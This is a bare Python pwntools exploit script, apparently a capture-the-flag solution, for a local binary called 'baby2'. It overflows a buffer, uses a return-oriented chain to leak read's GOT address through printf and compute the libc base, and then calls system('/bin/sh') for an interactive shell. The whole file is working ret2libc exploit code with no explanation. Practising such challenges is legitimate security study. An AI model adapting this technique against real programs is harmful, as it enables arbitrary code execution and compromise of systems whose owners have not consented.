#!/usr/bin/env python
from pwn import *

p = process("./baby2")
libc = ELF("./libc.so.6")
elf = ELF("./baby2")

pop_rdi = p64(0x00400733)

read_got = elf.got['read']
printf_plt = elf.plt['printf']
main_fnc = elf.symbols['main']
	 
payload = 'A' * 40 + pop_rdi + p64(read_got) +  p64(printf_plt) + p64(main_fnc)

p.recvuntil('? ')
p.sendline(payload)

p.recvline()
libc_base = u64(p.recv(6).ljust(8, '\0')) - libc.symbols['read']

system = libc_base + libc.symbols["system"]
bin_sh = libc_base + libc.search("/bin/sh\x00").next()

payload = 'A' * 40 + pop_rdi + p64(bin_sh) + p64(system)

p.sendlineafter('? ', payload)

p.interactive()
